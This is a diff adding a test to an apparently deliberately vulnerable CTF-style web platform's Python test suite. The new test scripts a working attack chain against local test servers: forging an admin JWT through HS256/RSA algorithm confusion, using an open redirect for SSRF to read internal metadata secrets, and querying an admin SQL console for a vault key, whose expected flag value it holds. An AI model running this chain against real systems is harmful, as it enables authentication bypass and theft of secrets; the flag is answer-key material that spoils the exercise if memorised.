@@ -146,6 +146,57 @@ class PlatformTests(unittest.TestCase):
         self.assertEqual(code, 403)
         self.assertEqual(headers.get('X-Security-Control'), 'PATH-TRAVERSAL-DEFENSE')
 
+    def test_12_advanced_ctf_chain(self):
+        import base64, hashlib, hmac, json, time
+
+        def b64(v):
+            return base64.urlsafe_b64encode(v).decode().rstrip('=')
+
+        # Step 1: Discover SSO public key
+        code, pubkey_raw, _ = self.request('/api/system/public-key')
+        self.assertEqual(code, 200)
+        pubkey = pubkey_raw.decode('utf-8') if isinstance(pubkey_raw, bytes) else str(pubkey_raw)
+        self.assertIn('BEGIN PUBLIC KEY', pubkey)
+
+        # Step 2: Forge admin JWT via algorithm confusion (HS256 using public key as HMAC key)
+        h = b64(json.dumps({'alg': 'HS256', 'typ': 'JWT', 'kid': 'sso-enterprise-2026'}).encode())
+        p = b64(json.dumps({'sub': 1, 'role': 'admin', 'plan': 'Institucional VIP', 'exp': int(time.time()) + 3600}).encode())
+        sig = b64(hmac.new(pubkey.encode('utf-8'), f'{h}.{p}'.encode('utf-8'), hashlib.sha256).digest())
+        forged_admin_token = f'{h}.{p}.{sig}'
+
+        code, me_data, _ = self.request('/api/me', token=forged_admin_token)
+        self.assertEqual(code, 200)
+        self.assertEqual(me_data['role'], 'admin')
+
+        # Step 3: Pivot via SSRF using open redirect to access internal metadata on loopback
+        server_port = self.servers[0].server_port
+        internal_port = self.internal.server_port
+        redirect_url = f'http://127.0.0.1:{server_port}/api/redirect?url=http://127.0.0.1:{internal_port}/metadata'
+        code, preview_res, _ = self.request(
+            '/api/resources/preview',
+            'POST',
+            {'url': redirect_url},
+            token=forged_admin_token
+        )
+        self.assertEqual(code, 200)
+        metadata = preview_res.get('preview', {})
+        elevation_key = metadata.get('secrets', {}).get('X-Admin-Elevation')
+        self.assertTrue(bool(elevation_key))
+
+        # Step 4: Access elevated administrative SQL console to recover master audit vault key
+        code, query_res, _ = self.request(
+            '/api/admin/query',
+            'POST',
+            {'sql': "SELECT name, value FROM vault WHERE name='MASTER_AUDIT_VAULT_KEY'"},
+            token=forged_admin_token,
+            headers={'X-Admin-Elevation': elevation_key}
+        )
+        self.assertEqual(code, 200)
+        rows = query_res.get('rows', [])
+        self.assertEqual(len(rows), 1)
+        self.assertEqual(rows[0]['name'], 'MASTER_AUDIT_VAULT_KEY')
+        self.assertEqual(rows[0]['value'], 'SEC-VAULT{e4c89a71b3f02e6d8a5c9b1e7f3a0d24}')
+
 
 if __name__ == '__main__':
     unittest.main(verbosity=2)
